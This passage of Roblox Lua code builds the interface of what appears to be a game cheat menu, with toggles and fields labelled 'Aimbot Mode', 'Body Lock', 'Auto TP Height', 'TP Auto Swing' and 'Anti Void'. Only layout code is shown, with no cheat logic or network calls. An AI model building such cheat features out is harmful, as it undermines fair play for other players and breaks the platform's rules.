G.TextLabel_13.BackgroundTransparency = 1
G.TextLabel_13.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_13.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_13.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_13.Text = "Auto TP Height"
G.TextLabel_13.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_13.TextSize = 14
G.TextLabel_13.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_13.Parent = G.Frame_18

-- TextBox_5 (TextBox)
G.TextBox_5 = Instance.new("TextBox")
G.TextBox_5.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
G.TextBox_5.BorderSizePixel = 0
G.TextBox_5.Position = UDim2.new(1, -64, 0.5, -13)
G.TextBox_5.Size = UDim2.new(0, 56, 0, 26)
G.TextBox_5.ZIndex = 6
G.TextBox_5.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextBox_5.Text = "20"
G.TextBox_5.TextColor3 = Color3.fromRGB(230, 230, 240)
G.TextBox_5.TextSize = 12
G.TextBox_5.ClearTextOnFocus = false
G.TextBox_5.Parent = G.Frame_18

-- UICorner_23 (UICorner)
G.UICorner_23 = Instance.new("UICorner")
G.UICorner_23.CornerRadius = UDim.new(0, 7)
G.UICorner_23.Parent = G.TextBox_5

-- Page2 (ScrollingFrame)
G.Page2 = Instance.new("ScrollingFrame")
G.Page2.Name = "Page2"
G.Page2.BackgroundTransparency = 1
G.Page2.BorderSizePixel = 0
G.Page2.Size = UDim2.new(1, 0, 1, 0)
G.Page2.Visible = false
G.Page2.AutomaticCanvasSize = Enum.AutomaticSize.Y
G.Page2.CanvasSize = UDim2.new(0, 0, 0, 0)
G.Page2.ScrollBarImageTransparency = 1
G.Page2.ScrollBarThickness = 0
G.Page2.Parent = G.Pages

-- UIListLayout_2 (UIListLayout)
G.UIListLayout_2 = Instance.new("UIListLayout")
G.UIListLayout_2.Padding = UDim.new(0, 3)
G.UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_2.Parent = G.Page2

-- UIPadding_2 (UIPadding)
G.UIPadding_2 = Instance.new("UIPadding")
G.UIPadding_2.PaddingBottom = UDim.new(0, 10)
G.UIPadding_2.PaddingLeft = UDim.new(0, 7)
G.UIPadding_2.PaddingRight = UDim.new(0, 7)
G.UIPadding_2.PaddingTop = UDim.new(0, 7)
G.UIPadding_2.Parent = G.Page2

-- Frame_19 (Frame)
G.Frame_19 = Instance.new("Frame")
G.Frame_19.BackgroundTransparency = 1
G.Frame_19.BorderSizePixel = 0
G.Frame_19.LayoutOrder = 23
G.Frame_19.Size = UDim2.new(1, 0, 0, 38)
G.Frame_19.Parent = G.Page2

-- TextLabel_14 (TextLabel)
G.TextLabel_14 = Instance.new("TextLabel")
G.TextLabel_14.BackgroundTransparency = 1
G.TextLabel_14.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_14.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_14.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_14.Text = "COMBAT"
G.TextLabel_14.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_14.TextSize = 15
G.TextLabel_14.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_14.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_14.Parent = G.Frame_19

-- Frame_20 (Frame)
G.Frame_20 = Instance.new("Frame")
G.Frame_20.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_20.BackgroundTransparency = 0.34999999403953552
G.Frame_20.BorderSizePixel = 0
G.Frame_20.Position = UDim2.new(0, 8, 1, -4)
G.Frame_20.Size = UDim2.new(1, -16, 0, 2)
G.Frame_20.Parent = G.Frame_19

-- Frame_21 (Frame)
G.Frame_21 = Instance.new("Frame")
G.Frame_21.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_21.BorderSizePixel = 0
G.Frame_21.ClipsDescendants = true
G.Frame_21.LayoutOrder = 24
G.Frame_21.Size = UDim2.new(1, 0, 0, 40)
G.Frame_21.Parent = G.Page2

-- UICorner_24 (UICorner)
G.UICorner_24 = Instance.new("UICorner")
G.UICorner_24.CornerRadius = UDim.new(0, 14)
G.UICorner_24.Parent = G.Frame_21

-- UIStroke_15 (UIStroke)
G.UIStroke_15 = Instance.new("UIStroke")
G.UIStroke_15.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_15.Parent = G.Frame_21

-- TextLabel_15 (TextLabel)
G.TextLabel_15 = Instance.new("TextLabel")
G.TextLabel_15.BackgroundTransparency = 1
G.TextLabel_15.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_15.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_15.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_15.Text = "Body Lock"
G.TextLabel_15.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_15.TextSize = 14
G.TextLabel_15.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_15.Parent = G.Frame_21

-- Frame_22 (Frame)
G.Frame_22 = Instance.new("Frame")
G.Frame_22.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_22.BorderSizePixel = 0
G.Frame_22.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_22.Size = UDim2.new(0, 46, 0, 24)
G.Frame_22.ZIndex = 3
G.Frame_22.Parent = G.Frame_21

-- UICorner_25 (UICorner)
G.UICorner_25 = Instance.new("UICorner")
G.UICorner_25.CornerRadius = UDim.new(1, 0)
G.UICorner_25.Parent = G.Frame_22

-- Frame_23 (Frame)
G.Frame_23 = Instance.new("Frame")
G.Frame_23.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_23.BorderSizePixel = 0
G.Frame_23.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_23.Size = UDim2.new(0, 18, 0, 18)
G.Frame_23.ZIndex = 4
G.Frame_23.Parent = G.Frame_22

-- UICorner_26 (UICorner)
G.UICorner_26 = Instance.new("UICorner")
G.UICorner_26.CornerRadius = UDim.new(1, 0)
G.UICorner_26.Parent = G.Frame_23

-- TextButton_7 (TextButton)
G.TextButton_7 = Instance.new("TextButton")
G.TextButton_7.BackgroundTransparency = 1
G.TextButton_7.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_7.ZIndex = 5
G.TextButton_7.AutoButtonColor = false
G.TextButton_7.Text = ""
G.TextButton_7:SetAttribute("PrintedSoundWired", true)
G.TextButton_7.Parent = G.Frame_22

-- Frame_24 (Frame)
G.Frame_24 = Instance.new("Frame")
G.Frame_24.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_24.BorderSizePixel = 0
G.Frame_24.ClipsDescendants = true
G.Frame_24.LayoutOrder = 25
G.Frame_24.Size = UDim2.new(1, 0, 0, 40)
G.Frame_24.Parent = G.Page2

-- UICorner_27 (UICorner)
G.UICorner_27 = Instance.new("UICorner")
G.UICorner_27.CornerRadius = UDim.new(0, 14)
G.UICorner_27.Parent = G.Frame_24

-- UIStroke_16 (UIStroke)
G.UIStroke_16 = Instance.new("UIStroke")
G.UIStroke_16.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_16.Parent = G.Frame_24

-- TextLabel_16 (TextLabel)
G.TextLabel_16 = Instance.new("TextLabel")
G.TextLabel_16.BackgroundTransparency = 1
G.TextLabel_16.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_16.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_16.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_16.Text = "Body Lock Range (9-20)"
G.TextLabel_16.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_16.TextSize = 14
G.TextLabel_16.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_16.Parent = G.Frame_24

-- TextBox_6 (TextBox)
G.TextBox_6 = Instance.new("TextBox")
G.TextBox_6.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
G.TextBox_6.BorderSizePixel = 0
G.TextBox_6.Position = UDim2.new(1, -64, 0.5, -13)
G.TextBox_6.Size = UDim2.new(0, 56, 0, 26)
G.TextBox_6.ZIndex = 6
G.TextBox_6.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextBox_6.Text = "12"
G.TextBox_6.TextColor3 = Color3.fromRGB(230, 230, 240)
G.TextBox_6.TextSize = 12
G.TextBox_6.ClearTextOnFocus = false
G.TextBox_6.Parent = G.Frame_24

-- UICorner_28 (UICorner)
G.UICorner_28 = Instance.new("UICorner")
G.UICorner_28.CornerRadius = UDim.new(0, 7)
G.UICorner_28.Parent = G.TextBox_6

-- Frame_25 (Frame)
G.Frame_25 = Instance.new("Frame")
G.Frame_25.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_25.BorderSizePixel = 0
G.Frame_25.ClipsDescendants = true
G.Frame_25.LayoutOrder = 26
G.Frame_25.Size = UDim2.new(1, 0, 0, 40)
G.Frame_25.Parent = G.Page2

-- UICorner_29 (UICorner)
G.UICorner_29 = Instance.new("UICorner")
G.UICorner_29.CornerRadius = UDim.new(0, 14)
G.UICorner_29.Parent = G.Frame_25

-- UIStroke_17 (UIStroke)
G.UIStroke_17 = Instance.new("UIStroke")
G.UIStroke_17.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_17.Parent = G.Frame_25

-- TextLabel_17 (TextLabel)
G.TextLabel_17 = Instance.new("TextLabel")
G.TextLabel_17.BackgroundTransparency = 1
G.TextLabel_17.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_17.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_17.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_17.Text = "Anti Void"
G.TextLabel_17.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_17.TextSize = 14
G.TextLabel_17.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_17.Parent = G.Frame_25

-- Frame_26 (Frame)
G.Frame_26 = Instance.new("Frame")
G.Frame_26.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_26.BorderSizePixel = 0
G.Frame_26.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_26.Size = UDim2.new(0, 46, 0, 24)
G.Frame_26.ZIndex = 3
G.Frame_26.Parent = G.Frame_25

-- UICorner_30 (UICorner)
G.UICorner_30 = Instance.new("UICorner")
G.UICorner_30.CornerRadius = UDim.new(1, 0)
G.UICorner_30.Parent = G.Frame_26

-- Frame_27 (Frame)
G.Frame_27 = Instance.new("Frame")
G.Frame_27.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_27.BorderSizePixel = 0
G.Frame_27.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_27.Size = UDim2.new(0, 18, 0, 18)
G.Frame_27.ZIndex = 4
G.Frame_27.Parent = G.Frame_26

-- UICorner_31 (UICorner)
G.UICorner_31 = Instance.new("UICorner")
G.UICorner_31.CornerRadius = UDim.new(1, 0)
G.UICorner_31.Parent = G.Frame_27

-- TextButton_8 (TextButton)
G.TextButton_8 = Instance.new("TextButton")
G.TextButton_8.BackgroundTransparency = 1
G.TextButton_8.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_8.ZIndex = 5
G.TextButton_8.AutoButtonColor = false
G.TextButton_8.Text = ""
G.TextButton_8:SetAttribute("PrintedSoundWired", true)
G.TextButton_8.Parent = G.Frame_26

-- Frame_28 (Frame)
G.Frame_28 = Instance.new("Frame")
G.Frame_28.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_28.BorderSizePixel = 0
G.Frame_28.ClipsDescendants = true
G.Frame_28.LayoutOrder = 27
G.Frame_28.Size = UDim2.new(1, 0, 0, 40)
G.Frame_28.Parent = G.Page2

-- UICorner_32 (UICorner)
G.UICorner_32 = Instance.new("UICorner")
G.UICorner_32.CornerRadius = UDim.new(0, 14)
G.UICorner_32.Parent = G.Frame_28

-- UIStroke_18 (UIStroke)
G.UIStroke_18 = Instance.new("UIStroke")
G.UIStroke_18.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_18.Parent = G.Frame_28

-- TextLabel_18 (TextLabel)
G.TextLabel_18 = Instance.new("TextLabel")
G.TextLabel_18.BackgroundTransparency = 1
G.TextLabel_18.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_18.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_18.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_18.Text = "Aimbot Mode"
G.TextLabel_18.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_18.TextSize = 14
G.TextLabel_18.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_18.Parent = G.Frame_28

-- DropChip (TextButton)
G.DropChip = Instance.new("TextButton")
G.DropChip.Name = "DropChip"
G.DropChip.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
G.DropChip.BorderSizePixel = 0
G.DropChip.Position = UDim2.new(1, -100, 0, 7)
G.DropChip.Size = UDim2.new(0, 90, 0, 26)
G.DropChip.ZIndex = 12
G.DropChip.AutoButtonColor = false
G.DropChip.Text = ""
G.DropChip:SetAttribute("PrintedSoundWired", true)
G.DropChip.Parent = G.Frame_28

-- UICorner_33 (UICorner)
G.UICorner_33 = Instance.new("UICorner")
G.UICorner_33.Parent = G.DropChip

-- UIStroke_19 (UIStroke)
G.UIStroke_19 = Instance.new("UIStroke")
G.UIStroke_19.Color = Color3.fromRGB(55, 60, 72)
G.UIStroke_19.Transparency = 0.40000000596046448
G.UIStroke_19.Parent = G.DropChip

-- TextLabel_19 (TextLabel)
G.TextLabel_19 = Instance.new("TextLabel")
G.TextLabel_19.BackgroundTransparency = 1
G.TextLabel_19.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_19.Size = UDim2.new(1, -22, 1, 0)
G.TextLabel_19.ZIndex = 13
G.TextLabel_19.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_19.Text = "V1"
G.TextLabel_19.TextColor3 = Color3.fromRGB(200, 204, 216)
G.TextLabel_19.TextSize = 12
G.TextLabel_19.TextTruncate = Enum.TextTruncate.AtEnd
G.TextLabel_19.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_19.Parent = G.DropChip

-- TextLabel_20 (TextLabel)
G.TextLabel_20 = Instance.new("TextLabel")
G.TextLabel_20.BackgroundTransparency = 1
G.TextLabel_20.Position = UDim2.new(1, -18, 0, 0)
G.TextLabel_20.Size = UDim2.new(0, 18, 1, 0)
G.TextLabel_20.ZIndex = 13
G.TextLabel_20.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_20.Text = "v"
G.TextLabel_20.TextColor3 = Color3.fromRGB(150, 155, 168)
G.TextLabel_20.TextSize = 11
G.TextLabel_20.Parent = G.DropChip

-- Frame_29 (Frame)
G.Frame_29 = Instance.new("Frame")
G.Frame_29.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_29.BorderSizePixel = 0
G.Frame_29.ClipsDescendants = true
G.Frame_29.LayoutOrder = 28
G.Frame_29.Size = UDim2.new(1, 0, 0, 40)
G.Frame_29.Parent = G.Page2

-- UICorner_34 (UICorner)
G.UICorner_34 = Instance.new("UICorner")
G.UICorner_34.CornerRadius = UDim.new(0, 14)
G.UICorner_34.Parent = G.Frame_29

-- UIStroke_20 (UIStroke)
G.UIStroke_20 = Instance.new("UIStroke")
G.UIStroke_20.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_20.Parent = G.Frame_29

-- TextLabel_21 (TextLabel)
G.TextLabel_21 = Instance.new("TextLabel")
G.TextLabel_21.BackgroundTransparency = 1
G.TextLabel_21.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_21.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_21.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_21.Text = "Auto Swing"
G.TextLabel_21.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_21.TextSize = 14
G.TextLabel_21.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_21.Parent = G.Frame_29

-- Frame_30 (Frame)
G.Frame_30 = Instance.new("Frame")
G.Frame_30.BackgroundColor3 = Color3.fromRGB(28, 90, 180)
G.Frame_30.BorderSizePixel = 0
G.Frame_30.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_30.Size = UDim2.new(0, 46, 0, 24)
G.Frame_30.ZIndex = 3
G.Frame_30.Parent = G.Frame_29

-- UICorner_35 (UICorner)
G.UICorner_35 = Instance.new("UICorner")
G.UICorner_35.CornerRadius = UDim.new(1, 0)
G.UICorner_35.Parent = G.Frame_30

-- Frame_31 (Frame)
G.Frame_31 = Instance.new("Frame")
G.Frame_31.BackgroundColor3 = Color3.new(0.53411763906478882, 0.77568626403808594, 1)
G.Frame_31.BorderSizePixel = 0
G.Frame_31.Position = UDim2.new(1, -21, 0.5, -9)
G.Frame_31.Size = UDim2.new(0, 18, 0, 18)
G.Frame_31.ZIndex = 4
G.Frame_31.Parent = G.Frame_30

-- UICorner_36 (UICorner)
G.UICorner_36 = Instance.new("UICorner")
G.UICorner_36.CornerRadius = UDim.new(1, 0)
G.UICorner_36.Parent = G.Frame_31

-- TextButton_9 (TextButton)
G.TextButton_9 = Instance.new("TextButton")
G.TextButton_9.BackgroundTransparency = 1
G.TextButton_9.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_9.ZIndex = 5
G.TextButton_9.AutoButtonColor = false
G.TextButton_9.Text = ""
G.TextButton_9:SetAttribute("PrintedSoundWired", true)
G.TextButton_9.Parent = G.Frame_30

-- AccentGrad (UIGradient)
G.AccentGrad = Instance.new("UIGradient")
G.AccentGrad.Name = "AccentGrad"
G.AccentGrad.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 100, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 180, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 120, 255))})
G.AccentGrad.Rotation = 28
G.AccentGrad.Parent = G.Frame_30

-- Frame_32 (Frame)
G.Frame_32 = Instance.new("Frame")
G.Frame_32.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_32.BorderSizePixel = 0
G.Frame_32.ClipsDescendants = true
G.Frame_32.LayoutOrder = 29
G.Frame_32.Size = UDim2.new(1, 0, 0, 40)
G.Frame_32.Parent = G.Page2

-- UICorner_37 (UICorner)
G.UICorner_37 = Instance.new("UICorner")
G.UICorner_37.CornerRadius = UDim.new(0, 14)
G.UICorner_37.Parent = G.Frame_32

-- UIStroke_21 (UIStroke)
G.UIStroke_21 = Instance.new("UIStroke")
G.UIStroke_21.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_21.Parent = G.Frame_32

-- TextLabel_22 (TextLabel)
G.TextLabel_22 = Instance.new("TextLabel")
G.TextLabel_22.BackgroundTransparency = 1
G.TextLabel_22.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_22.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_22.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_22.Text = "TP Cam Shake"
G.TextLabel_22.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_22.TextSize = 14
G.TextLabel_22.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_22.Parent = G.Frame_32

-- Frame_33 (Frame)
G.Frame_33 = Instance.new("Frame")
G.Frame_33.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_33.BorderSizePixel = 0
G.Frame_33.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_33.Size = UDim2.new(0, 46, 0, 24)
G.Frame_33.ZIndex = 3
G.Frame_33.Parent = G.Frame_32

-- UICorner_38 (UICorner)
G.UICorner_38 = Instance.new("UICorner")
G.UICorner_38.CornerRadius = UDim.new(1, 0)
G.UICorner_38.Parent = G.Frame_33

-- Frame_34 (Frame)
G.Frame_34 = Instance.new("Frame")
G.Frame_34.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_34.BorderSizePixel = 0
G.Frame_34.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_34.Size = UDim2.new(0, 18, 0, 18)
G.Frame_34.ZIndex = 4
G.Frame_34.Parent = G.Frame_33

-- UICorner_39 (UICorner)
G.UICorner_39 = Instance.new("UICorner")
G.UICorner_39.CornerRadius = UDim.new(1, 0)
G.UICorner_39.Parent = G.Frame_34

-- TextButton_10 (TextButton)
G.TextButton_10 = Instance.new("TextButton")
G.TextButton_10.BackgroundTransparency = 1
G.TextButton_10.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_10.ZIndex = 5
G.TextButton_10.AutoButtonColor = false
G.TextButton_10.Text = ""
G.TextButton_10:SetAttribute("PrintedSoundWired", true)
G.TextButton_10.Parent = G.Frame_33

-- Frame_35 (Frame)
G.Frame_35 = Instance.new("Frame")
G.Frame_35.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_35.BorderSizePixel = 0
G.Frame_35.ClipsDescendants = true
G.Frame_35.LayoutOrder = 30
G.Frame_35.Size = UDim2.new(1, 0, 0, 40)
G.Frame_35.Parent = G.Page2

-- UICorner_40 (UICorner)
G.UICorner_40 = Instance.new("UICorner")
G.UICorner_40.CornerRadius = UDim.new(0, 14)
G.UICorner_40.Parent = G.Frame_35

-- UIStroke_22 (UIStroke)
G.UIStroke_22 = Instance.new("UIStroke")
G.UIStroke_22.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_22.Parent = G.Frame_35

-- TextLabel_23 (TextLabel)
G.TextLabel_23 = Instance.new("TextLabel")
G.TextLabel_23.BackgroundTransparency = 1
G.TextLabel_23.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_23.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_23.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_23.Text = "TP Auto Swing"
G.TextLabel_23.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_23.TextSize = 14
G.TextLabel_23.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_23.Parent = G.Frame_35

-- Frame_36 (Frame)
G.Frame_36 = Instance.new("Frame")
G.Frame_36.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_36.BorderSizePixel = 0
G.Frame_36.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_36.Size = UDim2.new(0, 46, 0, 24)
G.Frame_36.ZIndex = 3
G.Frame_36.Parent = G.Frame_35

-- UICorner_41 (UICorner)
G.UICorner_41 = Instance.new("UICorner")
G.UICorner_41.CornerRadius = UDim.new(1, 0)
G.UICorner_41.Parent = G.Frame_36

-- Frame_37 (Frame)
G.Frame_37 = Instance.new("Frame")
G.Frame_37.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_37.BorderSizePixel = 0
G.Frame_37.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_37.Size = UDim2.new(0, 18, 0, 18)
G.Frame_37.ZIndex = 4
G.Frame_37.Parent = G.Frame_36

-- UICorner_42 (UICorner)
G.UICorner_42 = Instance.new("UICorner")
G.UICorner_42.CornerRadius = UDim.new(1, 0)
G.UICorner_42.Parent = G.Frame_37

-- TextButton_11 (TextButton)
G.TextButton_11 = Instance.new("TextButton")
G.TextButton_11.BackgroundTransparency = 1
G.TextButton_11.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_11.ZIndex = 5
G.TextButton_11.AutoButtonColor = false
G.TextButton_11.Text = ""
G.TextButton_11:SetAttribute("PrintedSoundWired", true)
G.TextButton_11.Parent = G.Frame_36

-- Frame_38 (Frame)
G.Frame_38 = Instance.new("Frame")
G.Frame_38.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_38.BorderSizePixel = 0
G.Frame_38.ClipsDescendants = true
G.Frame_38.LayoutOrder = 31
G.Frame_38.Size = UDim2.new(1, 0, 0, 40)
G.Frame_38.Parent = G.Page2

-- UICorner_43 (UICorner)
G.UICorner_43 = Instance.new("UICorner")
G.UICorner_43.CornerRadius = UDim.new(0, 14)
G.UICorner_43.Parent = G.Frame_38

-- UIStroke_23 (UIStroke)
G.UIStroke_23 = Instance.new("UIStroke")
G.UIStroke_23.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_23.Parent = G.Frame_38

-- TextLabel_24 (TextLabel)
G.TextLabel_24 = Instance.new("TextLabel")
G.TextLabel_24.BackgroundTransparency = 1
G.TextLabel_24.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_24.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_24.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_24.Text = "Mirror TP Down"
G.TextLabel_24.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_24.TextSize = 14
G.TextLabel_24.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_24.Parent = G.Frame_38

-- Frame_39 (Frame)
G.Frame_39 = Instance.new("Frame")
G.Frame_39.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_39.BorderSizePixel = 0
G.Frame_39.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_39.Size = UDim2.new(0, 46, 0, 24)
G.Frame_39.ZIndex = 3
G.Frame_39.Parent = G.Frame_38

-- UICorner_44 (UICorner)
G.UICorner_44 = Instance.new("UICorner")
G.UICorner_44.CornerRadius = UDim.new(1, 0)
G.UICorner_44.Parent = G.Frame_39

-- Frame_40 (Frame)
G.Frame_40 = Instance.new("Frame")
G.Frame_40.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_40.BorderSizePixel = 0
G.Frame_40.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_40.Size = UDim2.new(0, 18, 0, 18)
G.Frame_40.ZIndex = 4
G.Frame_40.Parent = G.Frame_39

-- UICorner_45 (UICorner)
G.UICorner_45 = Instance.new("UICorner")
G.UICorner_45.CornerRadius = UDim.new(1, 0)
G.UICorner_45.Parent = G.Frame_40

-- TextButton_12 (TextButton)
G.TextButton_12 = Instance.new("TextButton")
G.TextButton_12.BackgroundTransparency = 1
G.TextButton_12.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_12.ZIndex = 5
G.TextButton_12.AutoButtonColor = false
G.TextButton_12.Text = ""
G.TextButton_12:SetAttribute("PrintedSoundWired", true)
G.TextButton_12.Parent = G.Frame_39

-- Frame_41 (Frame)
G.Frame_41 = Instance.new("Frame")
G.Frame_41.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_41.BorderSizePixel = 0
G.Frame_41.ClipsDescendants = true
G.Frame_41.LayoutOrder = 32
G.Frame_41.Size = UDim2.new(1, 0, 0, 40)
G.Frame_41.Parent = G.Page2

-- UICorner_46 (UICorner)
G.UICorner_46 = Instance.new("UICorner")
G.UICorner_46.CornerRadius = UDim.new(0, 14)
G.UICorner_46.Parent = G.Frame_41

-- UIStroke_24 (UIStroke)
G.UIStroke_24 = Instance.new("UIStroke")
G.UIStroke_24.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_24.Parent = G.Frame_41

-- TextLabel_25 (TextLabel)
G.TextLabel_25 = Instance.new("TextLabel")
G.TextLabel_25.BackgroundTransparency = 1
G.TextLabel_25.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_25.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_25.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_25.Text = "Bat Counter"
G.TextLabel_25.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_25.TextSize = 14
G.TextLabel_25.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_25.Parent = G.Frame_41

-- Frame_42 (Frame)
G.Frame_42 = Instance.new("Frame")
G.Frame_42.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_42.BorderSizePixel = 0
G.Frame_42.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_42.Size = UDim2.new(0, 46, 0, 24)
G.Frame_42.ZIndex = 3
G.Frame_42.Parent = G.Frame_41

-- UICorner_47 (UICorner)
G.UICorner_47 = Instance.new("UICorner")
G.UICorner_47.CornerRadius = UDim.new(1, 0)
G.UICorner_47.Parent = G.Frame_42

-- Frame_43 (Frame)
G.Frame_43 = Instance.new("Frame")
G.Frame_43.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_43.BorderSizePixel = 0
G.Frame_43.Position = UDim2.new(0, 3, 0.5, -9)
